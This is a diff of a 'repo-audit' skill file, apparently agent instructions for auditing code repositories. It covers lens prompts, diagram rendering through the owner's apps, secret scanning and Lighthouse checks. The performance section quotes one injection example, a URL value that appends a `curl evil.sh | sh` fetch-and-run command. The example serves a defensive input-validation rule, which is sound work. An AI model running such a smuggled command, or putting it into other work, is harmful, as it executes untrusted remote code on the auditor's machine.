@@ -63,33 +63,6 @@ outside the report: `--issues` files the top fixes as GitHub issues (allowlisted
 owners only, see Step 5), and `--shot` writes a README screenshot PNG. Neither runs
 by default, so "read-only" stays literally true for a plain `/repo-audit` run.
 
-## Workflow mode (DEFAULT since 2026-09-30 - the fast path)
-
-The audit is now ONE saved workflow plus ONE deterministic script; nothing runs through a chat transcript
-by hand any more. Measured on 3 repos on 2026-09-30: the hand-driven glue (scoping, tech stack, diagrams,
-overlap check, gate, render, post) cost 10-15 minutes of sequential turns per repo and drifted slightly each
-time; the script does the same in under 30 seconds and never drifts.
-
-- **`orchestrate.py`** (this skill dir) - the glue. `scope <target> --out DIR` clones/refreshes into `~/code/<name>`,
-  measures files/LOC/vitality/churn/GitHub health/dependency advisories, writes `DIR/scope.json` + `DIR/base.json`.
-  `finish DIR` merges `DIR/<lens>.json` + `DIR/synthesis.json`, normalises, de-dups GBU, runs the evidence gate
-  (`verify.py --prune`, non-file citations held and re-added), builds the 3 app diagrams (Flows with the no-overlap
-  pass and a positioned re-create when the auto layout fails, Sequences staircase, Mindmaps), renders, archives,
-  posts to Stickies, prints a JSON summary. It never calls a model.
-- **`workflow/repo-audit.js`** (also installed at `~/.claude/workflows/repo-audit.js`) - the orchestration. Phases:
-  Scope (haiku script-runner) -> Lenses (10 lens agents + recon, all on the strong model, longest-first, `parallel`
-  barrier because synthesis needs every lens) -> Synthesis (strong model writes `synthesis.json`: top_fixes,
-  bottom_line, verified tech_stack, gbu_drop indexes, extra_findings, grade_overrides) -> Finish (haiku runs the
-  script). Only the 2 script-runner agents are cheap; every judgment agent stays on the session's strong model.
-- **Invoke:** `Workflow({scriptPath: "~/Sites/repo-audit/workflow/repo-audit.js", args: {target: "owner/repo"}})`.
-  Optional args: `out` (run dir, default `/tmp/repo-audit/<name>`), `only: ["security", ...]`, `model`, `noPost: true`.
-  Lens files already present in `out` are SKIPPED (delete a file to re-run that lens) - that is the cheap re-audit
-  path on top of the Workflow tool's own prompt cache (same script + same args = cached agent results).
-- **Resume:** relaunch with `resumeFromRunId`; unchanged lens prompts return instantly.
-- **Manual fallback** (no Workflow tool available): run `orchestrate.py scope`, launch the lens prompts from
-  `workflow/repo-audit.js` yourself with the Agent tool on the strong model, write `synthesis.json`, run
-  `orchestrate.py finish`. The Step 1-4 text below documents what those pieces do and why.
-
 ## Step 0: Prereq check
 
 ```bash
@@ -140,14 +113,13 @@ report can link them. Use `frontend-design` sensibilities only for the OUTPUT, n
 analysis.
 
 Per lens, gather:
-- **architect**: `summary`, `points[]` (structure/flow observations, each anchored at `path:line`), optional `table` (e.g. Layer/Role), `grade`, plus the **3 diagram handoffs below (MANDATORY - owner rule 2026-09-30, replaces the old inline `arch_canvas`)**. The renderer leads the section with the Flows diagram, then the critical-path step list, then the File layers Sequences diagram.
-  - **DIAGRAMS COME FROM THE 3 DIAGRAM APPS, NEVER FROM RENDERER-DRAWN SVG (owner 2026-09-30: the inline `arch_canvas` was unreadable at 19 nodes - overlapping subtitles and edge labels - and will not be produced again).** Build the architecture graph in the lens JSON as `arch_graph` = `{nodes:[{id, name, role, icon, color, src}], edges:[{from, to, label, dashed?}]}` (same evidence rules as before: every node and edge pinned to a real `src` path:line, icons = the SAME verified URL as the tech_stack entry). At synthesis, turn it into a **Flows** diagram via `/create-flow` (nodes -> `{id, label:name, sub:role, icon:<data URI of the verified logo>, note:"src: path:line"}`, edges -> `{source, target, label}`, `is_public:true`, create with `?format=svg`) and put the result on the TOP-LEVEL data as `system_design: {url, svg_url, svg}`. Inline the logos as `data:` URIs - Flows refuses remote icon hosts that redirect. `arch_canvas` and `stack_flow` are RETIRED: never output them; the renderer only uses them as a legacy fallback when `system_design` is absent.
-  - **`critical_path` stays TEXT (owner 2026-09-30: no Sequences diagram for it - the Flows diagram above is the picture).** Keep `critical_path` = `{title, steps:[{n, label, src, note?}]}` in the lens JSON: the ordered, path:line-pinned trace of the app's single most important operation. The renderer shows it as the numbered step list under the Flows diagram. Do NOT create a Sequences diagram for it and do NOT set a top-level `sequence` key; the renderer ignores one.
-  - **File layers -> Sequences (MANDATORY, owner 2026-09-30).** The Layer/Dir/Role `table` is also rendered as a Mermaid `sequenceDiagram` via `/create-sequence`, shaped TALL not WIDE (owner 2026-09-30: "hard to see, it's okay to have more vertical steps"): 3-5 participants only (lanes, e.g. `Entry` = bootstrap/auth, `UI` = views/components/styles, `Data` = hooks/state/services/util, `Quality` = tests/stories/CI; for IaC: `Roots`, `Modules`, `Shared`, `CI`), and ONE vertical step per layer row, as a forward-only staircase: sort the rows by lane order, draw an arrow `Prev->>Next: <Layer>: <dir (count)>` only where the layer moves to the next lane, and render every same-lane row as `note over Lane: <Layer>: <dir (count)>` (never self-messages, never backward arrows - they float off to the side and fight the reading order, owner 2026-09-30). Labels are the layer name plus dir and file count, never the role sentence; cap arrow labels at 48 characters and notes at 60 (a note only widens its own lane), and strip the common path prefix rather than truncating mid-word. The Role column stays in the Layer table below; at most one `note over` per diagram. Set TOP-LEVEL `file_layers_sequence: {url, svg_url, svg}`. The renderer-drawn vertical chain and the older `file_layers_mindmap` are legacy fallbacks only - never ship the drawn chain when a secret is missing, route the create through the M4 instead.
-  - **1 Flows diagram per repo (owner rule 2026-09-30, after 12 duplicates piled up on bc-poc, then ubs-appmarket-poc).** `orchestrate.flows_diagram` lays the nodes out locally first (`seed_positions` + `unoverlap`) and creates the flow exactly once - never "create, read the auto-layout back, create again". After the create it moves every earlier flow with the same title to Trash through the app's db module on the flows host (`retire_previous_flows`; flows are delete-locked against the HTTP API, and Trash is restorable). Do not hand-create a second Flows diagram for a repo that already has one; re-run the audit or edit the existing flow.
-  - **Work Mac / no local secret:** this Mac has no `flows`/`sequences` MCP and no `FLOWS_API_SECRET`/`SEQUENCES_API_SECRET`; the M4 does. Write the payload to a file and run the create over SSH: `ssh M4 'bash -s' < payload-and-curl.sh` (the script reads the secret from `~/Sites/flows/.env` / `~/Sites/sequences/.env.local` on the M4). Mindmaps has a local secret and posts directly. Never paste secrets through chat; never fall back to an inline SVG because a secret is missing - fix the path to the M4 instead.
-  - Color-code Flows node cards by role: `#3b82f6` blue for the app itself, `#f97316` orange for auth, `#8b5cf6` purple for external APIs, `#f59e0b` amber for databases, `#10b981` green for downstream services, `#ef4444` red for billing/payments (Flows reads the border from the logo for SVG icons; set `color` only for PNG icons).
-  - **EVIDENCE-PINNED - the archify rule (owner 2026-07-29). Every node and every edge MUST trace to real code; never invent topology or claim runtime behavior you did not read.** Give each node a `src` (the `path:line` where it is actually wired up) and derive each edge label from the ACTUAL call site. A node or arrow you cannot anchor to a file does not belong in the diagram. **FAIL CLOSED:** if you cannot establish a piece's placement, say so in the `summary` - never paper over an unknown with a clean-looking edge.
+- **architect**: `summary`, `points[]` (structure/flow observations, each anchored at `path:line`), optional `table` (e.g. Layer/Role), `grade`, an `arch_canvas` (MANDATORY - every repo, every run, no exceptions), and (when the repo has a clear core operation) a `critical_path`. The renderer leads the section with the diagram.
+  - **`arch_canvas` is REQUIRED on EVERY audit run - no repo is exempt, no fallback to `stack_flow` (owner 2026-08-13).** Format: `{width, height, nodes:[{id,x,y,name,role,icon,color}], edges:[{from,to,label,dashed?}]}`. Free-form SVG node-graph - real brand icons, colored node borders, labeled arrows. Width 900, height sized to fit (400-600 typical).
+  - **LOGO RULE - arch_canvas nodes MUST use the EXACT same verified icon as the tech_stack entry for that technology (owner 2026-08-13).** The `icon` field on each node must be `https://cdn.simpleicons.org/<slug>/<hexcolor>` using the SAME slug that was verified for the tech_stack table. Same priority order as tech_stack: verified simpleicons slug first (`https://cdn.simpleicons.org/<slug>`), then Iconify (`https://api.iconify.design/logos:<name>.svg`), then DuckDuckGo favicon (`https://icons.duckduckgo.com/ip3/<domain>.ico`) as last resort. NEVER use a generic placeholder, a monogram, or an unverified slug - if the slug returns 404 on simpleicons, use the next fallback. The diagram and the tech stack table must always show the same logo for the same technology - they are one consistent brand system. Known-correct slugs: `nodedotjs` (Node.js, green #339933), `express` (Express, black #000000), `react` (React, cyan #61dafb), `typescript` (TS, blue #3178c6), `nextdotjs` (Next.js, black #000000), `auth0` (Auth0, orange #eb5424), `docker` (Docker, blue #2496ed), `mysql` (MySQL, blue #4479a1), `postgresql` (Postgres, blue #4169e1), `amazondynamodb` -> use Iconify `logos:aws-dynamodb`, `amazons3` -> use Iconify `logos:aws-s3`.
+  - Color-code node borders by role: `#3b82f6` blue for the app itself, `#f97316` orange for auth, `#8b5cf6` purple for external APIs, `#f59e0b` amber for databases, `#10b981` green for downstream services, `#ef4444` red for billing/payments. When `arch_canvas` is present it takes priority over `stack_flow` in the renderer.
+  - **EVIDENCE-PINNED - the archify rule (owner 2026-07-29). Every node and every edge MUST trace to real code; never invent topology or claim runtime behavior you did not read.** Give each node a `src` (the `path:line` where it is actually wired up - the client component, the route handler, the `new Pool()`, the `pusher.trigger()`), and derive each `links[i]` protocol from the ACTUAL call site (open the fetch/query/subscribe line), not a guess. A node or arrow you cannot anchor to a file does not belong in the diagram. This is what makes the architecture verifiable instead of plausible-looking fiction.
+  - `stack_flow` is DEPRECATED - never output it. `arch_canvas` replaces it on every repo type (FE, BE, mobile, CLI, monorepo). The visual node-graph is always more useful than a tier list.
+  - `critical_path` = `{title, steps:[{n, label, src, note?}]}` (optional but strongly preferred). Trace the app's single most important operation end to end - e.g. "Create a note", "Serve a public share", "Auth a request" - as an ordered sequence with EACH hop pinned to `path:line`. This "how one real request actually flows" view catches architecture drift and dead/duplicate paths the static tier diagram hides.
   - **FAIL CLOSED (archify's ownership profile).** If you cannot establish a piece's placement, ownership, DB scope, or boundary crossing, SAY SO in the `summary` ("could not confirm X") - never paper over an unknown with a clean-looking edge. An honest gap beats an invented connection.
   - The `table` (file/module layers) still renders below the canvas as the detailed view.
 - **gbu**: `good[]`, `bad[]`, `ugly[]` - specific, not generic. Name files/patterns. NO grade - report-only.
@@ -172,7 +144,7 @@ Per lens, gather:
   copy-pasted regex, an unreviewed service worker, and a script hardcoding a path into another repo's
   `node_modules`. That gap is what this lens exists to close.
 - **uiux**: `summary`, `findings[]`, `grade`. Only judge repos WITH a user-facing UI - components, styles, templates, screens. Look for design-system discipline vs one-off styles, missing loading/empty/error states, a11y gaps (no alt text, no focus states, div-buttons), broken responsiveness. **BE-only repo: set `grade` to `"N/A"`** - the renderer then omits the lens from the report and scoring completely.
-- **features**: `summary`, `tree[]` (the feature map), `grade` (feature coherence - complete/consistent/scoped vs sprawl of half-built or abandoned features). **At synthesis, post `tree[]` to Mindmaps via `/create-mindmap`** (outline = `{"<repo> - Features": [ {"Branch - note": [children...]} ]}`, `sharing:true`, then GET the `svg_url`) and set TOP-LEVEL `features_mindmap: {url, svg_url, svg}`. The renderer embeds that SVG (click-through to the editable map) and keeps the collapsible feature list under it; the renderer-drawn mindmap is only a legacy fallback when `features_mindmap` is absent (owner 2026-09-30).
+- **features**: `summary`, `tree[]` (the mindmap), `grade` (feature coherence - complete/consistent/scoped vs sprawl of half-built or abandoned features).
 - **infra**: `summary`, `findings[]`, `grade`. Look at CI config, Dockerfiles, deploy scripts, env handling. If the repo has a GitHub remote AND `gh auth status` passes, add live GitHub health (all read-only, warn-only - skip silently if gh is absent/unauthed or the repo is not on GitHub): `gh pr list --state open --json number,updatedAt` (open PR count + how many are stale > 30 days), `gh run list --limit 5 --json conclusion` (is CI currently red?), `gh api repos/{owner}/{repo}/branches/<default>/protection` (404 = unprotected default branch - a finding for a multi-contributor repo). Config files say what SHOULD happen; these say what IS happening.
 - **security**: `summary`, `findings[]`, `grade`. Grep for secrets, check auth on routes, deps.
   **Always open these by name, they are where the misses happen:** the DB/connection module (TLS
@@ -181,6 +153,16 @@ Per lens, gather:
   interpolation is a finding even when today's inputs happen to be safe), the session/cookie module,
   and every handler that writes (is the row scoped to the owner, or addressed by id alone?). If `semgrep` is installed (`command -v semgrep`), run `semgrep scan --config p/owasp-top-ten --config p/secrets --json --quiet <ABS>` first and fold its hits into findings (deterministic rules catch what a read-through skims past; warn-only - skip silently when absent). If `gitleaks` is installed (`command -v gitleaks`), also run `gitleaks detect --source <ABS> --no-banner --report-format json --report-path "$(mktemp -t gitleaks)" --exit-code 0` and DELETE that file the moment you have read it (`rm -f`) - its contents are the target's real secret VALUES, and a predictable world-readable path in /tmp is a second disclosure on a shared machine. Never copy a value out of it into the report; cite `file:line` and say what KIND of credential it is. Invoke as `` and fold its hits into findings - entropy-based detection catches tokens manual grep misses. Warn-only: if gitleaks is absent, note "gitleaks not installed, grep-only secret scan" in the summary and move on (same pattern as the dep scanners). NEVER print a real secret value in the report - cite the file:line and say "hardcoded token" instead. For dependency CVEs, do not guess from version strings - run the stack's real scanner when available (warn-only, never fix): `npm audit --json`, `pip-audit`, `govulncheck ./...`, `cargo audit`, `bundle audit`. If none is available, say the dep check was skipped instead of inventing CVEs.
 - **performance**: `summary`, `findings[]`, `grade`, optional `metrics[]`. **Run Lighthouse when a homepage/domain URL applies (owner request 2026-07-16).** If the project is web-facing AND you have a public homepage/deployed URL - `package.json` `homepage`, a README badge/link, a known prod domain, or one the user gives - run it headless, warn-only. The URL comes from the TARGET repo, so it is untrusted input: quote it, and refuse it unless it matches `^https?://[A-Za-z0-9.-]+(/[^\s"'`;|&$]*)?$` - a value like `https://x.com; curl evil.sh | sh` must never reach a shell: `npx --yes lighthouse "<url>" --quiet --only-categories=performance,accessibility,best-practices,seo --chrome-flags="--headless=new" --output=json --output-path=/tmp/lh.json` then read the four category scores (0-100). Put them in the performance lens `metrics` (`["Lighthouse Perf","82"], ["A11y","91"], ["Best Practices","83"], ["SEO","95"]`) so they render, and turn any weak score (< 80) into a finding. ONLY for a real homepage/domain URL - skip for libraries, CLIs, BE-only repos, or any repo with no deployed site, and skip (noting it) if `lighthouse`/`npx` is unavailable or the URL 404s. Never guess scores - omit the metrics if Lighthouse did not actually run.
+  **MANDATORY - Hero media quality check (owner rule 2026-10-11, goal: 100 in all 4 Lighthouse categories).** Every repo with a UI: find the banner/hero media (first-viewport `<img>`/`<picture>`, hero `background-image`, `<video>` + `poster`, YouTube/Vimeo iframes, hero props/constants holding a media URL) and judge BOTH sharpness and weight. Measure, never eyeball: images with `sips -g pixelWidth -g pixelHeight -g format` (or `identify -format '%w %h %Q'`) plus file size; local video with `ffprobe -v error -select_streams v:0 -show_entries stream=codec_name,width,height,bit_rate -show_entries format=size,duration -of json`. Always emit ONE performance finding titled `Hero media: <sharp|BLURRY|too heavy|third-party embed>` and add metrics rows (e.g. `["Hero image","2000x1333 . 420 KB . JPEG"]`, `["Hero video","YouTube embed"]`). Rules:
+  - **Blurry** (severity high - it is the first thing a visitor sees): a full-bleed image under 1920px wide (retina desktop needs a 2560-2880px source), JPEG quality under ~70, a visibly upscaled asset, a video under 1080p, a 1080p H.264 under ~4 Mbps, or ANY YouTube/Vimeo embed as the hero (quality capped by the player's adaptive stream, plus ~1 MB of third-party JS - title it `third-party embed`). State WHY with the numbers.
+  - **Too heavy** (severity high): a hero image over ~400 KB in its best format, a source over 2x the largest rendered width, no AVIF/WebP, no `srcset`/`image-set()`, a hero video over ~8 MB, or an LCP image that is lazy-loaded or a CSS background (cannot be preloaded or prioritised well).
+  - **The fix MUST cover all 5 steps - make, load, set, cache, deploy:**
+    1. *Make*: images -> AVIF + WebP at 640/1280/1920/2560/2880w from the original (`npx sharp-cli` or `magick in.jpg -resize 2560x -quality 60 out.avif`). Video -> from the ORIGINAL file, never a re-download of a stream: `ffmpeg -i in.mov -vf scale=-2:1080 -c:v libx264 -crf 20 -preset slow -profile:v high -pix_fmt yuv420p -movflags +faststart -an hero-1080.mp4`, an AV1 twin (`-c:v libsvtav1 -crf 32 hero-1080.webm`), a 720p mobile version, and a poster frame (`-ss 1 -frames:v 1`, then AVIF/WebP). Target 3-8 MB per video.
+    2. *Load*: hero image as `<img>`/`<picture>` with `srcset`+`sizes`, explicit `width`/`height`, `fetchpriority="high"`, never `loading="lazy"`, plus `<link rel="preload" as="image" imagesrcset=...>`. Video as `<video autoplay muted loop playsinline preload="metadata" poster=...>` with one `<source>` per codec, a smaller source for mobile via `media`, the poster as the LCP element, and `prefers-reduced-motion` respected. Drop the YouTube iframe; if one must stay, use a click-to-play facade (lite-youtube).
+    3. *Set*: correct MIME types (`video/mp4`, `video/webm`, `image/avif`), HTTP Range requests on for video, brotli/gzip for text only.
+    4. *Cache*: content-hashed filenames + `Cache-Control: public, max-age=31536000, immutable` for media; short cache for HTML.
+    5. *Deploy*: serve media from a CDN/edge (Cloudflare, Bunny, R2, or the VPS behind a CDN) over HTTP/2 or HTTP/3; keep originals out of git (LFS or object storage) and commit only derivatives.
+  If the hero is already sharp AND light, still emit it at severity low titled `Hero media: sharp` with the measured numbers - the report must always show the hero media state.
 - **quality**: `summary`, optional `metrics[]` (e.g. ["Types","strict"], ["Lint","eslint"]), `findings[]`, `grade`. Include **churn hotspot analysis** (git repos only): `git log --format= --name-only --since=6.months | sort | uniq -c | sort -rn | head -15` gives the most-changed files. Read the top 3-5 that are source files (skip lockfiles/docs) - a file that is BOTH high-churn AND complex/untested is where the next bug lives; flag those as findings ("hotspot: changed 41x in 6 months, 400 lines, zero tests"). A hot file that is clean is not a finding. Also check **dependency freshness** (separate from CVEs - a dep can be 3 majors behind with zero CVEs and still be a finding): `npm outdated --json` / `pip list --outdated` / `go list -u -m all` when the stack's tool is available (warn-only, skip if not). Report majors-behind counts as a metric (e.g. ["Deps outdated","6 major / 14 minor"]) and flag any core framework (React, Next, Django, the main runtime) more than one major behind as a finding with severity medium.
 - **tests**: `summary`, optional `metrics[]` (e.g. ["Test files","42"], ["Framework","jest"], ["E2E","none"]), `findings[]`, `grade`. Inventory what EXISTS (frameworks, unit/integration/e2e split, coverage config + committed reports, CI test steps, test-file to source-file ratio) and flag what SHOULD exist: churn hotspots with zero tests, uncovered error paths, missing e2e on the core flow, snapshot-only suites with no real assertions. Static judgment only - NEVER run the suite (never-execute rule). Zero tests on a code repo = F, never N/A.
 - **docs**: `summary`, optional `metrics[]` (e.g. ["README","320 lines"], ["Docs","4 files"], ["Diagrams","2 mermaid"]), `findings[]`, `grade`. Two halves:
@@ -318,7 +300,7 @@ at token parity with the old sequential run.
 (same script + args = cached agent results for $0), so re-auditing an UNCHANGED repo is
 nearly free and only changed lenses re-run. That is the real efficiency lever.
 
-**Preferred mechanism:** the saved workflow in `workflow/repo-audit.js` (see "Workflow mode" above) - a deterministic fan-out with a real
+**Preferred mechanism:** the `Workflow` tool - a deterministic fan-out with a real
 barrier (and an opt-in verify stage). Hand-launching background `Agent` calls works too
 (that is how this skill has been run), but a Workflow makes the barrier, the join, and
 the cache explicit and reproducible. Either way: scope once -> fan out on the strong
@@ -384,6 +366,21 @@ Compute: median + p90 of (additions+deletions), median changedFiles, median merg
 }
 ```
 
+**HARD RULE - the owner's own apps draw every diagram (owner rule, restated 2026-10-10).** `render.py` does it itself, render only (`source: "repo-audit"`, nothing stored), and embeds each returned svg:
+- **Flows** draws the architecture (`arch_canvas` -> `render_flows_diagram`, `$FLOWS_API_BASE`, default http://localhost:5174).
+- **Sequences** draws the request flow (`critical_path` -> Mermaid `sequenceDiagram`, one participant per file -> `render_sequences_trace`, `$SEQUENCES_API_BASE`, default the Vercel app). The path:line evidence ladder stays under it.
+- **Mindmaps** draws the features tree (`features.tree` -> JSON outline -> `render_mindmaps_features`, `$MINDMAPS_API_BASE`, default the Vercel app).
+Any other diagram worth one (a flow -> Sequences, a hierarchy -> Mindmaps, a topology -> Flows) goes to the same app. With the app's secret set (`FLOWS_API_SECRET`, `SEQUENCES_API_SECRET`, `MINDMAPS_API_SECRET`), a failed render EXITS NON-ZERO and no report is written - the built-in SVGs are never shipped in their place. They are used only on a machine with none of these configured. Never bypass this with a custom renderer, workflow or hand-built SVG.
+
+**Flows picture (owner rule 2026-10-04):** the architecture diagram for the report
+is rendered only, never stored. Call `create_flow` (or `POST /api/ai/flows`) with
+`source: "repo-audit"` plus `lanes`, and embed the returned `svg` as a base64
+`data:image/svg+xml` image in the report. See the "Diagram Handoff" block at the
+top of `~/.claude/skills/repo-recon/SKILL.md` for the exact body. Mindmaps and
+Sequences read the same `source` field, so any picture an audit asks of them
+carries it too, and neither stores one: both answer `200 {stored: false, svg}`.
+Embed the svg - an audit's diagram is never linked, because there is no url.
+
 `render.py` automatically renders the `recon` block as an "Onboarding Brief" section at the bottom of the report if the key is present. If `recon` is absent (e.g. `--only` scoped run), no section is rendered. **This replaces `/repo-recon` entirely - do not invoke that skill.**
 
 ## Step 2d: PRE-RENDER SELF-CHECK (MANDATORY before writing JSON - owner 2026-08-13)
@@ -391,14 +388,14 @@ Compute: median + p90 of (additions+deletions), median changedFiles, median merg
 Before writing `reports/repo-audit-data.json` or calling `render.py`, stop and run this checklist against your own output. Fix any failures before proceeding.
 
 **Icon consistency (most common error):**
-- [ ] Every `arch_graph` node `icon` is the EXACT same verified logo URL as the `tech_stack` entry for that technology (then inlined as a data URI for Flows). Do NOT pick an icon independently for the diagram.
+- [ ] Every `arch_canvas` node `icon` URL uses the EXACT same simpleicons slug as the `tech_stack` entry for that technology. Look up each node's technology name in `tech_stack`, copy the slug from there, and use `https://cdn.simpleicons.org/<SAME_SLUG>/<color>`. Do NOT pick an icon independently for the diagram.
 - [ ] No `tech_stack` row has a blank `slug` AND no fallback `icon` URL - if simpleicons 404s, use Iconify or DDG favicon, never a monogram.
 - [ ] Node.js: slug is `nodedotjs`, color is `339933` (green). Never purple.
 - [ ] All slugs checked against the SLUG_FIX dict in `render.py` (dead slugs remapped there).
 
 **Completeness:**
-- [ ] `system_design` (Flows), `file_layers_sequence` (Sequences) and `features_mindmap` (Mindmaps) are present on the top-level data with a non-empty `svg` each - all 3 are mandatory on every full run. No top-level `sequence` key (critical-path diagram retired 2026-09-30). No `arch_canvas`, no `stack_flow`, no renderer-drawn diagram.
-- [ ] Every `arch_graph` node and edge traces to a real `src` file:line (not invented).
+- [ ] `arch_canvas` is present - it is mandatory on every run, no fallback to `stack_flow`.
+- [ ] Every arch_canvas node and edge traces to a real `src` file:line (not invented).
 - [ ] No `tech_stack` entry has version `-` without a note explaining the search attempt.
 
 **State before proceeding:** write one line: `self-check: passed` OR `self-check: corrected X` (list what you fixed). Then proceed to build the JSON.
@@ -484,6 +481,30 @@ silent.
   the user can close them by hand - closing stays a human decision.
 
 Report created / skipped / stale issue numbers in the Step 4 chat summary.
+
+## Sequence diagrams: ask for the SVG, never a library row
+
+An audit renders its own diagrams (`arch_canvas`, `critical_path`) and does not
+need the Sequences app. If a run ever does want a real Mermaid sequence diagram
+for the report, call the import endpoint in RENDER-ONLY mode and embed the markup
+it returns. It must never file a row in the owner's library (owner rule
+2026-10-04): a 2026-09-30 run posted its layer table on every re-render and left
+30 duplicate `<repo> - File Layers` rows behind.
+
+```bash
+curl -s -X POST "$SEQUENCES_API_BASE/api/ai/sequences" \
+  -H "Authorization: Bearer $SEQUENCES_API_SECRET" \
+  -H 'Content-Type: application/json' \
+  -d '{"title":"<repo> - Request Flow",
+       "code":"sequenceDiagram\n  A->>B: hi",
+       "source":"repo-audit",
+       "store":false}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["svg"])'
+```
+
+`source` is the marker that says where the diagram came from: the API records it
+on every call and answers any `*-audit` source with `200 {stored:false, source,
+svg}` - no id, no url, no canvas, nothing stored. `store:false` does the same for
+any other report skill. Drop the returned `<svg>` straight into the report.
 
 ## Step 3b: HD README screenshot (opt-in, `--shot`)
 
